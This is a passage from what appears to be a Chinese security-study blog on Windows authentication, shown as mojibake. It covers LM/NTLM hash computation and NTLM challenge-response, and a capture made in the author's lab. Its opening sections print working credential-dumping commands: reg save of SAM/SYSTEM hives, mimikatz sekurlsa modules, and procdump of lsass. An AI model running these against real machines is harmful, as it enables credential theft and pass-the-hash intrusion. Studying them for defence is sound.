çš„ç”µè„‘ä¸Šï¼Œä¸éœ€è¦ç»•è¿‡æ€è½¯ï¼‰ 1234567reg save hklm\\sam sam.hivereg save hklm\\system system.hivemimikatz.exe &quot;lsadump::sam /sam:sam.hive /system:system.hive&quot;# nishangçš„copy-vssè¿›è¡Œå¤åˆ¶ å¦‚æœè„šæœ¬è¿è¡Œåœ¨DCä¸Šï¼Œntds.ditå’ŒSYSTEM hiveä¹Ÿèƒ½è¢«dumpå‡ºæ¥copy-vss # æ–‡ä»¶ä¼šç›´æ¥ä¿å­˜åœ¨å½“å‰è·¯å¾„ä¸‹ å¼Šç«¯ï¼šæœ‰çš„æ–‡ä»¶è¿‡å¤§ï¼Œä¼ è¾“è¿‡ç¨‹å®¹æ˜“ä¸­æ–­ å®é™…ä¸Šï¼Œèƒ½ä¸èƒ½ç¦»çº¿ç ´è§£å‡ºæ¥è¿™ä¸ªæ˜æ–‡å¯†ç éƒ½ä¸€æ · æ‹¿åˆ°NTLM Hashå€¼å³å¯ å› ä¸ºWindowsä¸Šçš„è®¤è¯éƒ½æ˜¯å¯¹è¿™ä¸ªå€¼è®¤è¯çš„ï¼Œåé¢çš„ PTH å“ˆå¸Œä¼ é€’æ”»å‡»æ—¶ä¼šæåˆ°ã€‚administratoræ˜¯è‚¯å®šå¯ä»¥åˆ©ç”¨è¿›è¡ŒPTHçš„ã€‚ (5) æœ‰ä»€ä¹ˆæ–¹å¼è¯»å–lsassè¿›ç¨‹ åœ¨çº¿è¯»å– lsassè¿›ç¨‹ ä» lsassè¿›ç¨‹ä¸­æå– passwordsã€keysã€pinã€ticketsç­‰ä¿¡æ¯ 12345678privilege::debugsekurlsa::msv # è·å–HASHï¼ˆLMï¼ŒNTLMï¼‰sekurlsa::wdigest # é€šè¿‡å¯é€†çš„æ–¹å¼å»å†…å­˜ä¸­è¯»å–æ˜æ–‡å¯†ç sekurlsa::kerberos # å¦‚æœåŸŸç®¡ç†å‘˜ç™»å½•äº†æˆ‘ä»¬ç”µè„‘ï¼Œå¯ä»¥ä»¥æ­¤æ¥è·å–åŸŸç®¡çš„æ˜æ–‡å¯†ç sekurlsa::tspkg # é€šè¿‡tspkgæ¥è·å–æ˜æ–‡å¯†ç sekurlsa::livessp # é€šè¿‡livessp è¯»å–æ˜æ–‡å¯†ç å•Šsekurlsa::ssp # é€šè¿‡sspè¯»å–æ˜æ–‡å¯†ç sekurlsa::logonPasswords # é€šè¿‡ä¸Šè¿°å„ç§æ–¹å¼è¯»å–æ˜æ–‡å¯†ç  ç¦»çº¿è¯»å– lsassè¿›ç¨‹ lsass.exeç³»ç»Ÿè¿›ç¨‹ åœ¨ä»»åŠ¡ç®¡ç†å™¨ä¸­å¯ä»¥çœ‹åˆ°ã€‚ å®é™…ä¸Šæˆ‘ä»¬å¯ä»¥ å³é”®-&gt; åˆ›å»ºå­˜å‚¨æ–‡ä»¶ ä¹Ÿå¯ä»¥ç”¨å·¥å…· procedump 1procdump64.exe -accepteula -ma lsass.exe lsass.dmp å¤åˆ¶å‡ºæ¥æœ¬åœ°ä½¿ç”¨mimikatz è¯»å– lsass.dmpæ–‡ä»¶ 1mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; ä¸Šé¢ä¸¤ç§æ–¹å¼éƒ½å¯ä»¥çœ‹åˆ°ï¼Œè¯»å–äº† NTLMçš„å€¼ï¼Œä½†æ˜¯æ˜æ–‡å¯†ç é‚£å´æ˜¯ (null) ä¸ºä»€ä¹ˆä¼šè¿™æ ·å‘¢ï¼Ÿ é«˜ç‰ˆæœ¬å¼ƒç”¨äº†LMï¼ŒåŒæ—¶ä¹Ÿä¸å†å¾€å†…å­˜é‡Œå†™å…¥æ˜æ–‡å¯†ç  &lt;2&gt; Windows LMå’ŒNTLMå“ˆå¸ŒåŠ å¯†è¿‡ç¨‹(1) LM HASHå€¼ä»‹ç»Windowsæ“ä½œç³»ç»Ÿé€šå¸¸ä½¿ç”¨ä¸¤ç§æ–¹æ³•å¯¹ç”¨æˆ·æ˜æ–‡å¯†ç è¿›è¡ŒåŠ å¯†å¤„ç†ã€‚ä¸€éƒ¨åˆ†ä¸º LM-Hashï¼Œå¦ä¸€éƒ¨åˆ†ä¸ºNTLM-Hashã€‚ åœ¨åŸŸç¯å¢ƒä¸­,ç”¨æˆ·ä¿¡æ¯å­˜å‚¨åœ¨ntds.ditä¸­ï¼ŒåŠ å¯†åä¸ºæ•£åˆ—å€¼ Hashç»“æ„ï¼šusername:RID:LM-HASH:NT-HASH LM Hash å…¨åä¸º â€œLAN Manager Hashâ€ ï¼Œæ˜¯å¾®è½¯ä¸ºäº†æé«˜Windowsæ“ä½œç³»ç»Ÿçš„å®‰å…¨æ€§è€Œé‡‡ç”¨çš„æ•£åˆ—åŠ å¯†ç®—æ³•ï¼Œå…¶æœ¬è´¨æ˜¯ DES åŠ å¯†ã€‚å°½ç®¡LM Hash æ¯”è¾ƒå®¹æ˜“ç ´è§£ï¼Œä½†ä¸ºäº†ä¿è¯ç³»ç»Ÿçš„å…¼å®¹æ€§ï¼ŒWindows åªæ˜¯å°† LM Hashç¦ç”¨äº†(ä» Windows vista å’Œ Windows Server2008ç‰ˆæœ¬å¼€å§‹ï¼ŒWindowsæ“ä½œç³»ç»Ÿé»˜è®¤ç¦ç”¨LM Hash)ã€‚ LM Hashæ˜æ–‡å¯†ç è¢«é™å®šåœ¨14ä½ä»¥å†…ï¼Œå³å¦‚æœè¦åœæ­¢ä½¿ç”¨ LM Hashï¼Œå°†ç”¨æˆ·å¯†ç è®¾ç½®æˆ14ä½ä»¥ä¸Šå³å¯ã€‚ å¦‚æœLM Hashè¢«ç¦ç”¨äº†ï¼Œæ”»å‡»è€…é€šè¿‡å·¥å…·æŠ“å–çš„LM Hashé€šå¸¸ ä¸º â€œad3435b51404eead3b435b51404eeâ€ (è¡¨ç¤ºLM Hashä¸ºç©ºå€¼æˆ–è¢«ç¦ç”¨) NTLM Hashæ˜¯å¾®è½¯ä¸ºäº†åœ¨æé«˜å®‰å…¨æ€§çš„åŒæ—¶ï¼Œä¿è¯å…¼å®¹æ€§è€Œè®¾è®¡çš„æ•£åˆ—åŠ å¯†ç®—æ³•ã€‚NTLM Hashæ˜¯åŸºäº MD4åŠ å¯†ç®—æ³•è¿›è¡ŒåŠ å¯†çš„ã€‚ä¸ªäººç‰ˆçš„Windows vista ä»¥åï¼ŒæœåŠ¡å™¨ç‰ˆä» Windows Server2003 ä»¥åï¼ŒWindows æ“ä½œç³»ç»Ÿçš„è®¤è¯æ–¹å¼å‡ä¸º NTLM Hash ä¸ºäº†è§£å†³åŠ å¯†å’Œèº«ä»½éªŒè¯æ–¹æ¡ˆä¸­å›ºæœ‰çš„å®‰å…¨å¼±ç‚¹ï¼ŒMicrosoft äº 1993å¹´åœ¨Windows NT 3.1 ä¸­å¼•å…¥äº†NTLMåè®®ã€‚ä¸‹é¢æ˜¯å„ä¸ªç‰ˆæœ¬å¯¹ LM Hashå’Œ NTLM Hashçš„æ”¯æŒ åŠ å¯†ç±»å‹ 2000 XP 2003 Vista Win7 2008 Win8 2012 Win10 2016 Win11 LM-Hash 1 1 1 1 NTLM-Hash 1 1 1 1 1 1 1 (2) LM HashåŠ å¯†åŸç†å‡è®¾æˆ‘ä»¬ administratorçš„å¯†ç ä¸º Admin@123 åŠ å¯†è¿‡ç¨‹å¦‚ä¸‹ï¼š å°†æ˜æ–‡å£ä»¤è½¬æ¢ä¸ºå…¶å¤§å†™å½¢å¼ å³ Admin@123 -&gt; ADMIN@123 å°†å­—ç¬¦ä¸²å¤§å†™åè½¬æ¢ä¸º16è¿›åˆ¶å­—ç¬¦ä¸² 41 44 4D 49 4E 40 31 32 33 å¯†ç ä¸è¶³14å­—èŠ‚è¦æ±‚ç”¨0è¡¥å…¨ï¼Œå¯†ç ä¸º9ä¸ªå­—ç¬¦ï¼Œè¿˜å·®5ä¸ª è¡¥00 è¡¥å…¨åä¸ºï¼š41 44 4D 49 4E 40 31 32 33 00 00 00 00 00 ç„¶åå°†ä¸Šè¿°ç¼–ç åˆ†æˆ2ç»„7å­—èŠ‚ ç¬¬ä¸€ç»„ï¼š41 44 4D 49 4E 40 31 ç¬¬äºŒç»„ï¼š32 33 00 00 00 00 00 å†å°†æ¯ä¸€ç»„7å­—èŠ‚çš„åå…­è¿›åˆ¶è½¬æ¢ä¸ºäºŒè¿›åˆ¶,æ¯7bit ä¸€ç»„æœ«å°¾åŠ 0,åœ¨è½¬æ¢æˆåå…­è¿›åˆ¶ç»„æˆå¾—åˆ°2ç»„8å­—èŠ‚çš„ç¼–ç  ç¬¬ä¸€ç»„ï¼š0100 0001 0100 0100 0100 1101 0100 1001 0100 1110 0100 0000 0011 0001 ç¬¬äºŒç»„ï¼š0011 0010 0011 0011 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 ä¸ƒä½ä¸€ç»„åˆ†å¼€ æœ«å°¾åŠ ä¸Š0 å¾—åˆ°ï¼š ç¬¬ä¸€ç»„ï¼š0100000010100010000100101010100010010100011100100000000001100010 ç¬¬äºŒç»„ï¼š0011001000011000110000000000000000000000000000000000000000000000 å†æŒ¨ä¸ªè½¬æ¢æˆåå…­è¿›åˆ¶ ç¬¬ä¸€ç»„ï¼š40A212A894720062 ç¬¬äºŒç»„ï¼š3218C00000000000 å°†ä»¥ä¸Šæ­¥éª¤å¾—åˆ°çš„ä¸¤ç»„8å­—èŠ‚çš„ç¼–ç ï¼Œåˆ†åˆ«ä½œä¸ºDESåŠ å¯†çš„key ç»™é­”æœ¯å­—ç¬¦ä¸²â€KGS!@#$%â€ è¿›è¡ŒåŠ å¯† KGS!@#$%çš„16è¿›åˆ¶ä¸º 4B47532140232425 å…ˆç”¨ç¬¬ä¸€ç»„å½“key å¾—åˆ°ï¼š6F08D7B306B1DAD4 å†ç”¨ç¬¬äºŒç»„å½“key å¾—åˆ°ï¼šB75E0C8D76954A50 æœ€ç»ˆæ‹¼æ¥å³å¯ï¼Œ6F08D7B306B1DAD4B75E0C8D76954A50 å³ Admin@123 çš„ LM-Hashå€¼ (3) NTLM Hashå€¼ä»‹ç»NTLM Hashæ˜¯å¾®è½¯ä¸ºäº†åœ¨æé«˜å®‰å…¨æ€§çš„åŒæ—¶ï¼Œä¿è¯å…¼å®¹æ€§è€Œè®¾è®¡çš„æ•£åˆ—åŠ å¯†ç®—æ³•ã€‚NTLM Hashæ˜¯åŸºäº MD4åŠ å¯†ç®—æ³•è¿›è¡ŒåŠ å¯†çš„ã€‚ä¸ªäººç‰ˆçš„Windows vista ä»¥åï¼ŒæœåŠ¡å™¨ç‰ˆä» Windows Server2003 ä»¥åï¼ŒWindows æ“ä½œç³»ç»Ÿçš„è®¤è¯æ–¹å¼å‡ä¸º NTLM Hash (4) NTLM hashä¸NTLMçš„å…³ç³»æ³¨ï¼šNTLM Hashå€¼è·Ÿ NTLMåè®®ä¸æ˜¯ä¸€ä¸ªä¸œè¥¿ï¼Œåˆ«æ··æ·†äº† NTLM hashä¸ºwindowsè®¤è¯ä¸­çš„å¯†ç å“ˆå¸Œæ•£åˆ—ï¼Œè€Œ NTLMæ˜¯ä¸€ç§ç½‘ç»œè®¤è¯åè®®ï¼Œå…¨ç§° NT LAN Managerï¼Œä½¿ç”¨NTLM hashä½œä¸ºè®¤è¯ä¸­çš„æ ¹æœ¬å‡­è¯ LM Hash å³ LMåè®®æ‰€ä½¿ç”¨çš„å¯†ç hashã€‚NT å’Œ LMè®¤è¯æœºåˆ¶ç›¸åŒï¼Œä½†åŠ å¯†ç®—æ³•ä¸åŒï¼Œç”±äº LM Hashæ¯”è¾ƒå®¹æ˜“ç ´è§£ï¼Œåœ¨æ–°ä¸€ç‚¹çš„ç‰ˆæœ¬è¢«æ·˜æ±° (5) NTLM HashåŠ å¯†åŸç†å‡è®¾æˆ‘ä»¬ administratorçš„å¯†ç ä¸º Admin@123 åŠ å¯†è¿‡ç¨‹å¦‚ä¸‹ï¼š å°†æ˜æ–‡å£ä»¤è½¬æ¢æˆåå…­è¿›åˆ¶çš„æ ¼å¼ å¾—åˆ°ï¼š41646D696E40313233 å°†åå…­è¿›åˆ¶è½¬æ¢æˆUnicodeæ ¼å¼ï¼Œå³åœ¨æ¯ä¸ªå­—èŠ‚åæ·»åŠ 0x00 å¾—åˆ°ï¼š410064006D0069006E004000310032003300 å¯¹ Unicodeå­—ç¬¦ä¸² hexè½¬ç åä½œ MD4 åŠ å¯†ï¼Œç”Ÿæˆ32ä½çš„åå…­è¿›åˆ¶å­—ç¬¦ä¸² å¾—åˆ°ï¼š570a9a65db8fba761c1008a51d4c95ab cmd5å¯ä»¥çˆ†ç ´å‡ºæ¥è¿™ä¸ªå¼±å£ä»¤ æ‰€ä»¥ æˆ‘ä»¬ç”µè„‘é‡ŒSAMæ–‡ä»¶å­˜æ”¾çš„hashå¯†æ–‡å³ä¸º administrator:6F08D7B306B1DAD4B75E0C8D76954A50:570a9a65db8fba761c1008a51d4c95ab å¦‚æœ LM hashè¢«ç¦ç”¨ï¼Œé‚£ä¹ˆä¸­é—´çš„LM Hashåº”è¯¥å°±æ˜¯ â€œaad3b435b51404eeaad3b435b51404eeâ€ æˆ‘ä»¬åˆ©ç”¨ mimikatz æŠ“å¯†ç å·¥å…· å†æ¥éªŒè¯ä¸€ä¸‹ 123mimikatz.exe # è¿›å…¥åˆ°mimikatzçš„å‘½ä»¤è¡Œprivilege::debug # æåˆ°debugæƒé™sekurlsa::logonPasswords # é€šè¿‡å„ç§æ–¹å¼æŠ“å–å¯†ç  ä¸€æ¨¡ä¸€æ · ç”¨python æ¥è¿›è¡ŒNTLMåŠ å¯†çš„è¯ï¼Œä»£ç ä¸ºï¼š 1234567import binasciiunicode_str = &quot;Admin@123&quot;.encode(&quot;utf-16le&quot;) # è½¬unicodeæ ¼å¼ï¼Œæ¯ä¸ªå­—èŠ‚ååŠ 00print(unicode_str)hex_str = binascii.hexlify(unicode_str)print(hex_str.decode())# b'A\\x00d\\x00m\\x00i\\x00n\\x00@\\x001\\x002\\x003\\x00'# 410064006d0069006e004000310032003300 å¯ä»¥å¾—åˆ°ç¬¬äºŒæ­¥å¯¹åº”çš„ 16è¿›åˆ¶ä¸²ï¼Œç„¶åä½¿ç”¨hashcalcåŠ å¯†å³å¯ &lt;3&gt; Windowsç½‘ç»œè®¤è¯å½“æˆ‘ä»¬è®¿é—®åŒä¸€å±€åŸŸç½‘çš„ä¸€å°ä¸»æœºä¸Šçš„SMBå…±äº«æ—¶æä¾›å‡­è¯é€šè¿‡éªŒè¯æ‰èƒ½æˆåŠŸè¿›è¡Œè®¿é—®ï¼Œè¿™å°±æ¶‰åŠåˆ°windowsçš„ç½‘ç»œè®¤è¯ (1) ç½‘ç»œè®¤è¯æ¦‚è¿°ç½‘ç»œè®¤è¯ï¼šWindowsç½‘ç»œè®¤è¯æ˜¯æŒ‡åœ¨Windows æ“ä½œç³»ç»Ÿä¸­è¿›è¡Œç½‘ç»œé€šä¿¡å’Œèµ„æºè®¿é—®æ—¶ï¼ŒéªŒè¯ç”¨æˆ·èº«ä»½å’Œæˆæƒæƒé™çš„è¿‡ç¨‹ã€‚å®ƒç¡®ä¿åªæœ‰ç»è¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·èƒ½å¤Ÿè®¿é—®ç½‘ç»œèµ„æºï¼Œå¹¶æ ¹æ®å…¶æƒé™çº§åˆ«è¿›è¡Œæˆæƒæ“ä½œã€‚ ç½‘ç»œè®¤è¯æœ‰å“ªäº›ï¼Ÿ (2) NTLMåè®®NTLMï¼šNTLM å³ NT LAN Managerï¼Œæ˜¯ä¸€ç§æ—©æœŸçš„Windows ç½‘ç»œè®¤è¯åè®®ï¼Œå®ƒåŸºäº æŒ‘æˆ˜ï¼ˆChallengeï¼‰/å“åº”ï¼ˆResponseï¼‰çš„æ–¹å¼è¿›è¡Œèº«ä»½è®¤è¯ã€‚å°½ç®¡Kerberos å·²ç»æˆä¸ºé¦–é€‰çš„è®¤è¯åè®®ï¼ŒNTLM åœ¨æŸäº›æƒ…å†µä¸‹ä»åœ¨ä½¿ç”¨ï¼Œç‰¹åˆ«åœ¨æ—§ç‰ˆWindowsç³»ç»Ÿæˆ–éWindowsç³»ç»Ÿè¿›è¡Œäº¤äº’æ“ä½œæ—¶ NTLMä¸­ç»§ï¼ˆNTLM Relayï¼‰ï¼šæ˜¯æŒ‡åœ¨NTLMè®¤è¯è¿‡ç¨‹ä¸­è®¾ç½®ä¸­é—´äººå¯¹HTLMè®¤è¯çš„è¯·æ±‚æˆªè·å¹¶è½¬å‘çš„ä¸€ç§æ”»å‡»è¡Œä¸º (3) NTLMåè®®è®¤è¯æœºåˆ¶NTLMåœ¨å·¥ä½œç»„ç¯å¢ƒçš„è®¤è¯å…¶è®¤è¯è¿‡ç¨‹å¤§è‡´åˆ†ä¸ºä¸‰æ­¥ï¼š åå•†ï¼šè§£å†³å†å²é—ç•™é—®é¢˜ï¼Œä¸ºäº†èƒ½å‘ä¸‹å…¼å®¹ï¼ŒåŒæ–¹ä¼šç¡®å®šä¸€ä¸‹ä¼ è¾“åè®®çš„ç‰ˆæœ¬ç­‰å„ç§ä¿¡æ¯ è´¨è¯¢ï¼š æŒ‘æˆ˜ï¼ˆChallengeï¼‰/å“åº”ï¼ˆResponseï¼‰è®¤è¯æœºåˆ¶çš„å…³é”® éªŒè¯ï¼šå¯¹è´¨è¯¢çš„ç»“æœè¿›è¡ŒéªŒè¯ï¼ŒéªŒè¯é€šè¿‡åå³ å…è®¸è®¿é—®èµ„æºã€‚æ˜¯è®¤è¯çš„æœ€åä¸€æ­¥ NTLMåè®® v1 v2ç‰ˆæœ¬åŒºåˆ« åå•†æ—¶ä¼šç¡®å®šä¼ è¾“åè®®çš„ç‰ˆæœ¬ï¼Œè¿™é‡Œç‰ˆæœ¬åˆ†ä¸ºv1å’Œv2ã€‚ NTLMv1ä¸NTLM v2æœ€æ˜¾è‘—çš„åŒºåˆ«å°±æ˜¯ å…±åŒç‚¹å°±æ˜¯åŠ å¯†çš„åŸæ–™éƒ½æ˜¯NTLM Hash ä¸åŒç‚¹æ˜¯Challengeä¸åŠ å¯†ç®—æ³•ä¸åŒï¼ŒNTLM v1çš„Challengeæœ‰8ä½ï¼ŒNTLM v2çš„Challengeä¸º16ä½ï¼›NTLM v1çš„ä¸»è¦åŠ å¯†ç®—æ³•æ˜¯DESï¼ŒNTLM v2çš„ä¸»è¦åŠ å¯†ç®—æ³•æ˜¯HMAC-MD5 å·¥ä½œç»„ä¸­è®¤è¯è¿‡ç¨‹ï¼š å½“å®¢æˆ·ç«¯è¦è®¿é—®æœåŠ¡å™¨ä¸ŠæŸä¸ªå—ä¿æŠ¤çš„æœåŠ¡æ—¶ï¼Œéœ€è¦è¾“å…¥æœåŠ¡å™¨çš„ç”¨æˆ·åå’Œå¯†ç è¿›è¡ŒéªŒè¯ã€‚æ­¤æ—¶å®¢æˆ·ç«¯ä¼šåœ¨æœ¬åœ°ç¼“å­˜ä¸€ä»½æœåŠ¡å™¨å¯†ç çš„NTLM hashï¼Œç„¶åå‘æœåŠ¡å™¨å‘é€åå•†æ¶ˆæ¯ã€‚ æœåŠ¡å™¨æ”¶åˆ°å®¢æˆ·ç«¯çš„åå•†ä¿¡æ¯åï¼Œç”Ÿæˆå¹¶å›å¤è´¨è¯¢æ¶ˆæ¯ã€‚è¯¥æ¶ˆæ¯ä¸­åŒ…å«äº†ä¸€ä¸ªç”±æœåŠ¡ç«¯ç”Ÿæˆçš„16ä½éšæœºå€¼challengeï¼ŒæœåŠ¡å™¨ä¹Ÿä¼šåœ¨æœ¬åœ°ç¼“å­˜è¯¥å€¼ã€‚ å®¢æˆ·ç«¯æ”¶åˆ°è´¨è¯¢æ¶ˆæ¯åï¼Œä¼šä½¿ç”¨æ­¥éª¤1ä¸­ç¼“å­˜çš„æœåŠ¡å™¨çš„NTLM hash ä¸ Challengeè¿›è¡Œä¸€ç³»åˆ—åŠ å¯†ç”Ÿæˆ Responseï¼Œå†å°† Response å°è£…åˆ°èº«ä»½éªŒè¯æ¶ˆæ¯ä¸­å‘å¾€æœåŠ¡å™¨ã€‚ æœåŠ¡å™¨åœ¨æ”¶åˆ°èº«ä»½éªŒè¯æ¶ˆæ¯åï¼Œç”¨è‡ªå·±å¯†ç çš„NTLM hashä¸Challengeè¿›è¡ŒåŠ å¯†ç”ŸæˆResponse2ï¼Œå¹¶æ¯”è¾ƒResponse2ä¸Responseæ˜¯å¦ä¸€è‡´ã€‚å¦‚æœä¸€è‡´ï¼Œå°±è¯æ˜å®¢æˆ·ç«¯æŒæ¡äº†æœåŠ¡å™¨çš„å¯†ç ï¼Œè®¤è¯æˆåŠŸï¼Œå¦åˆ™è®¤è¯å¤±è´¥ã€‚ NTLMåœ¨åŸŸç¯å¢ƒä¸‹çš„è®¤è¯åœ¨åŸŸç¯å¢ƒä¸­ï¼Œç”±äºæ‰€æœ‰åŸŸç”¨æˆ·çš„å“ˆå¸Œå€¼éƒ½å­˜å‚¨åœ¨ åŸŸæ§çš„ NTDS.dit ä¸­ï¼ŒæœåŠ¡å™¨æœ¬èº«æ— æ³•è®¡ç®—Responseæ¶ˆæ¯ï¼Œå› æ­¤éœ€è¦ä¸åŸŸæ§å»ºç«‹ä¸€ä¸ªå®‰å…¨é€šé“ï¼Œå¹¶é€šè¿‡åŸŸæ§å®Œæˆæœ€åçš„è®¤è¯æµç¨‹ã€‚å‰ä¸‰ä¸ªæ­¥éª¤åŒå·¥ä½œç»„ç¯å¢ƒçš„è®¤è¯ åŸŸä¸­è®¤è¯è¿‡ç¨‹ï¼š å½“åŸŸç”¨æˆ·è¾“å…¥è‡ªå·±çš„è´¦å·å’Œå¯†ç ç™»å½•å®¢æˆ·ç«¯ä¸»æœºæ—¶ï¼Œå®¢æˆ·ç«¯ä¼šå°†ç”¨æˆ·è¾“å…¥çš„å¯†ç è½¬æ¢ä¸ºNTLM hashå¹¶ç¼“å­˜ã€‚å½“ç”¨æˆ·æƒ³è®¿é—®åŸŸå†…æŸå°æœåŠ¡å™¨ä¸Šçš„èµ„æºæ—¶ï¼Œå®¢æˆ·ç«¯ä¼šå‘æœåŠ¡å™¨å‘é€TYPE1 Negotiateæ¶ˆæ¯ æœåŠ¡å™¨æ”¶åˆ°å®¢æˆ·ç«¯çš„åå•†ä¿¡æ¯åï¼Œç”Ÿæˆå¹¶å›å¤è´¨è¯¢æ¶ˆæ¯ã€‚æœåŠ¡ç«¯å‘é€Type2 NTLMSSP_CHALLENGEæ¶ˆæ¯,å…¶ä¸­åŒ…å«16ä½çš„éšæœºChallengeå€¼ å®¢æˆ·ç«¯æ”¶åˆ°è´¨è¯¢æ¶ˆæ¯åï¼Œä¼šä½¿ç”¨æ­¥éª¤1ä¸­ç¼“å­˜çš„åŸŸç”¨æˆ·çš„NTLM hash ä¸ Challengeè¿›è¡Œä¸€ç³»åˆ—åŠ å¯†ç”Ÿæˆ Responseã€‚å®¢æˆ·ç«¯å‘é€Type3 NTLMSSP_AUTHæ¶ˆæ¯,å…¶ä¸­åŒ…æ‹¬Responseæ¶ˆæ¯ æœåŠ¡ç«¯æ”¶åˆ°å®¢æˆ·ç«¯å‘æ¥çš„Type3 NTLMSSP_AUTHæ¶ˆæ¯åï¼Œä¼šå°†æ¶ˆæ¯é€šè¿‡ Netlogonåè®®è½¬å‘ç»™åŸŸæ§åˆ¶å™¨ åŸŸæ§æ ¹æ®è‡ªèº«è®¡ç®—å‡ºçš„Net-NTLM Hashä¸æœåŠ¡ç«¯å‘è¿‡æ¥çš„Net-NTLM Hashåšæ¯”è¾ƒï¼Œç„¶åæ ¹æ®ç»“æœå¯¹å®¢æˆ·ç«¯è¿›è¡Œç›¸åº”çš„å›å¤ (4) NTLMåŸºæœ¬æ¦‚å¿µSSPI/SSPSSPIæ˜¯å®‰å…¨æœåŠ¡æ¥å£æ˜¯Windowså®šä¹‰çš„ä¸€å¥—æ¥å£,è¯¥æ¥å£å®šä¹‰äº†ä¸å®‰å…¨æœ‰å…³çš„åŠŸèƒ½å‡½æ•°,åŒ…æ‹¬ä½†ä¸é™äº: èº«ä»½éªŒè¯æœºåˆ¶ ä¸ºå…¶ä»–åè®®æä¾›ä¼šè¯å®‰å…¨å¯ä¸ºé€šä¿¡æä¾›å®Œæ•´æ€§æ ¡éªŒä»¥åŠæ•°æ®çš„åŠ å¯†ã€è§£å¯†çš„åŠŸèƒ½ã€‚ SSPI åªæ˜¯å®šä¹‰äº†ä¸€å¥—æ¥å£å‡½æ•°,å…·ä½“å®ç°æœ‰SSPå®Œæˆã€‚ SSPæ˜¯SSPIçš„å®ç°è€…,å¾®è½¯è‡ªå·±ä¹Ÿå®ç°äº†å¾ˆå¤šSSPç”¨äºæä¾›å®‰å…¨åŠŸèƒ½ å…¸å‹çš„SSPå®ç°: NTLM SSP:Windows NT 3.5ä¸­å¼•å…¥(msv1_0.dll)ä¸ºWindows 2000ä¹‹å‰çš„å®¢æˆ·ç«¯æä¾›æœåŠ¡å™¨åŸŸå’ŒéåŸŸèº«ä»½éªŒè¯ï¼ˆSMB/CIFS)æä¾›NTLMè´¨è¯¢/å“åº”èº«ä»½éªŒè¯ Kerberos SSP:Windows 2000 ä¸­å¼•å…¥ä¸ºWindows 2000ä»¥åŠæ›´é«˜çš„ç‰ˆæœ¬ä¸­é¦–é€‰å®¢æˆ·ç«¯-æœåŠ¡å™¨åŸŸæä¾›ç›¸äº’èº«ä»½éªŒè¯ SSPIä¸­å®šä¹‰äº†ä¼šè¯å®‰å…¨çš„API,æ‰€ä»¥ä¸Šå±‚åº”ç”¨åˆ©ç”¨ä»»ä½•SSPä¸è¿œç¨‹çš„æœåŠ¡è¿›è¡Œèº«ä»½éªŒè¯å,SSPéƒ½ä¼šä¸ºæœ¬æ¬¡çš„è¿æ¥ç”Ÿæˆä¸€ä¸ªéšæœºkey,è¿™ä¸ªéšæœºkeyï¼Œç§°ä¸ºâ€session keyâ€ ï¼Œä¸Šå±‚çš„åº”ç”¨ç»è¿‡èº«ä»½éªŒè¯åï¼Œå¯ä»¥é€‰æ‹©æ€§ä½¿ç”¨è¿™ä¸ªsession key,å¾€æœåŠ¡ç«¯æˆ–è€…æ¥æ”¶æœåŠ¡ç«¯çš„æ•°æ®è¿›è¡Œç­¾åæˆ–åŠ å¯†ï¼ŒSSPå°±æ˜¯ä¸€ä¸ªdllï¼Œç”¨æ¥å®ç°èº«ä»½éªŒè¯ç­‰å®‰å…¨åŠŸèƒ½ï¼Œä¸åŒçš„SSPå®ç°èº«ä»½éªŒè¯çš„æ–¹å¼æ˜¯ä¸ä¸€æ ·çš„ï¼Œæ¯”å¦‚NTLM SSPå®ç°çš„æ˜¯ä¸€ç§åŸºäºè´¨è¯¢/å“åº”çš„èº«ä»½éªŒè¯æœºåˆ¶ï¼ŒKerberos SSPå®ç°çš„æ˜¯åŸºäºTickç¥¨æ®çš„èº«ä»½éªŒè¯æœºåˆ¶ã€‚ (5) NTLMè®¤è¯è¿‡ç¨‹æŠ“åŒ…åˆ†æä¸ºäº†å­¦ä¹ æ–¹ä¾¿ï¼Œåˆæ­äº†ä¸€å¥—åŸŸç¯å¢ƒ Win2012 IPï¼š192.168.16.10 å³ DC Win2008 IPï¼š192.168.16.20 åŸŸå†…ä¸»æœº æˆ‘ä»¬æ‰“å¼€ wireshark ç›‘å¬ åŸŸç¯å¢ƒçš„é‚£ä¸ªVMNet ä½¿ç”¨è®¿é—®å¦ä¸€å°ä¸»æœºçš„å…±äº« net use \\\\192.168.16.10\\ipc$ /u:administrator Admin@123 æ ¹æ®æŠ“åˆ°çš„æ•°æ®åŒ…ï¼Œä¸‹é¢ä¹Ÿå¯ä»¥çœ‹åˆ°ï¼Œnet use æ˜¯åŸºäºSMBåè®® æˆ‘ä»¬ å…ˆçœ‹å‰å››ä¸ªæ•°æ®åŒ…ï¼ŒNegotiate Protocol Responseï¼Œæ˜¯è¿›è¡Œåå•†çš„ å†å¾€ä¸‹çœ‹ ç¬¬äº”ä¸ªæ•°æ®åŒ…ï¼Œè¿™ä¸ªæ˜¯ç”¨æˆ·å¯åŠ¨èº«ä»½çš„éªŒè¯åŒ… flagé‡Œç¡®å®šäº†ä¸€äº›ç›¸å…³è§„åˆ™ ç¬¬å…­ä¸ªæ•°æ®åŒ… åŒ…å«äº†challengeå€¼ ç¬¬ä¸ƒä¸ªæ•°æ®åŒ…æ˜¯ å‘é€Responseçš„æ•°æ®åŒ…ï¼Œè¿˜åŒ…å«è´¦æˆ·åçš„ç›¸å…³ä¿¡æ¯ å®¢æˆ·ç«¯æ ¹æ®è·å¾—çš„ä¿¡æ¯ï¼Œè¿›è¡Œä¸€ç³»åˆ—åŠ å¯†å¾—åˆ°Responseï¼Œå³è¿™é‡Œçš„ â€œNTLMv2 Responseâ€ çš„å€¼ ç¬¬å…«ä¸ªæ•°æ®åŒ… å³è¿”å›ç»“æœï¼Œç”¨æ¥è¡¨ç¤ºæˆåŠŸ or å¤±è´¥ å¤±è´¥å³ERROR (6) challengeå’ŒResponseåˆ†æchallengeæ˜¯éšæœºæ•°ï¼Œä½æ•°å–å†³äº NTLMåè®®çš„ç‰ˆæœ¬ å‰é¢æåˆ°äº† responseæ˜¯å¦‚ä½•ç»„æˆçš„ responseç”± NTProofStr+blobä¸¤éƒ¨åˆ†ç»„æˆ NTProofStrï¼šä½¿ç”¨ NTLM v2 Hashå€¼ä½œä¸ºkey å¯¹(challenge+blob) è¿›è¡Œ HMAC-MD5åŠ å¯† NTLM v2 Hashï¼šå¤§å†™Username+Domain name è¿›è¡Œunicodeç¼–ç 